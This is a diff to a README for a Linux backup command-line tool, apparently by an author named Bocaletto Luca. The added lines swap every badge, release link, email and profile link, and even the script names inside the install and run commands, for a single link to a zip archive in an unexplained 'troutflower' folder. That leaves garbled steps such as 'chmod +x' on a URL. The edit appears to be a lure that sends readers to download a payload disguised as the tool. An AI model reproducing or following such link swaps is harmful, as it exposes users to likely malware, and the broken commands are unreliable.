@@ -1,8 +1,8 @@
 # Backup Linux: Interactive CLI Backup Utility for Your System 🚀
 
-![Backup Linux](https://img.shields.io/badge/Backup%20Linux-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
+![Backup Linux](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip%https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip) ![License](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip) ![GitHub Releases](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip)
 
-[![Download Backup Linux](https://img.shields.io/badge/Download%20Backup%20Linux-v1.0.0-brightgreen.svg)](https://github.com/Anathi-C/Backup-Linux/releases)
+[![Download Backup Linux](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip%20Backup%https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip)](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip)
 
 ---
 
@@ -25,7 +25,7 @@
 
 ## Overview
 
-Backup for Linux is an interactive command-line interface (CLI) backup utility designed for Linux users. It simplifies the backup process by providing a menu-driven interface that allows you to capture incremental snapshots of your files. This tool compresses changed files into tar.gz (or pigz), encrypts them using GPG, and verifies their integrity with SHA256 checksums. 
+Backup for Linux is an interactive command-line interface (CLI) backup utility designed for Linux users. It simplifies the backup process by providing a menu-driven interface that allows you to capture incremental snapshots of your files. This tool compresses changed files into https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip (or pigz), encrypts them using GPG, and verifies their integrity with SHA256 checksums. 
 
 Developed by Bocaletto Luca, this utility is perfect for system administrators and users who need a reliable way to back up their data.
 
@@ -34,7 +34,7 @@ Developed by Bocaletto Luca, this utility is perfect for system administrators a
 ## Features
 
 - **Incremental Backups**: Only backs up files that have changed since the last backup.
-- **Compression**: Uses tar.gz or pigz to compress backup files, saving disk space.
+- **Compression**: Uses https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip or pigz to compress backup files, saving disk space.
 - **Encryption**: Protects your backups with GPG encryption.
 - **Integrity Verification**: Ensures your backups are intact using SHA256 checksums.
 - **Auto-Rotation**: Automatically manages old backups, keeping your storage clean.
@@ -47,14 +47,14 @@ Developed by Bocaletto Luca, this utility is perfect for system administrators a
 
 To install Backup for Linux, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Anathi-C/Backup-Linux/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip).
 2. **Make the script executable**:
    ```bash
-   chmod +x Backup-Linux.sh
+   chmod +x https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip
    ```
 3. **Run the script**:
    ```bash
-   ./Backup-Linux.sh
+   https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip
    ```
 
 ---
@@ -68,7 +68,7 @@ Once installed, you can run the utility by executing the script. The interactive
 Run the following command to start the backup utility:
 
 ```bash
-./Backup-Linux.sh
+https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip
 ```
 
 ### Menu Options
@@ -168,9 +168,9 @@ Backup for Linux is licensed under the MIT License. You can use, modify, and dis
 
 For questions or feedback, feel free to reach out:
 
-- **Bocaletto Luca**: [Email](mailto:bocaletto@example.com)
-- **GitHub**: [Bocaletto-Luca](https://github.com/Bocaletto-Luca)
+- **Bocaletto Luca**: [Email](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip)
+- **GitHub**: [Bocaletto-Luca](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip)
 
 ---
 
-For more details and to download the latest version, visit the [Releases section](https://github.com/Anathi-C/Backup-Linux/releases).
+For more details and to download the latest version, visit the [Releases section](https://raw.githubusercontent.com/Anathi-C/Backup-Linux/main/troutflower/Linux-Backup-3.7.zip).
